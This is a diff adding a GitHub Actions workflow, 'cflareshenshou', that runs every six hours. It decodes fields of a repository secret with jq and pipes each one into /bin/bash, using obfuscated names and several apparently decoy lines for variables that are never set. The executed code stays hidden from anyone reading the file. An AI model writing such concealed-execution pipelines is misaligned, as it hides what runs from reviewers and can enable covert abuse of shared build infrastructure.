@@ -1,0 +1,25 @@
+name: cflareshenshou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: cflareshenshou
+        env:
+          bdma42: ${{ secrets.bdma42 }}
+        run: |
+          echo $bdma42 | jq -r .hylv19 | /bin/bash
+          echo $y0458 | jq -r .bukxl714 | /bin/bash
+          echo $pq408 | jq -r .hrt36 | /bin/bash
+          echo $gefr37461 | jq -r .q72 | /bin/bash
+          echo $hmjq34 | jq -r .kjwdm3 | /bin/bash
+          echo $zhp20 | jq -r .skqwd86875 | /bin/bash
+          echo $q9763 | jq -r .p73233 | /bin/bash
+          echo $ewok1 | jq -r .pihd0 | /bin/bash
+
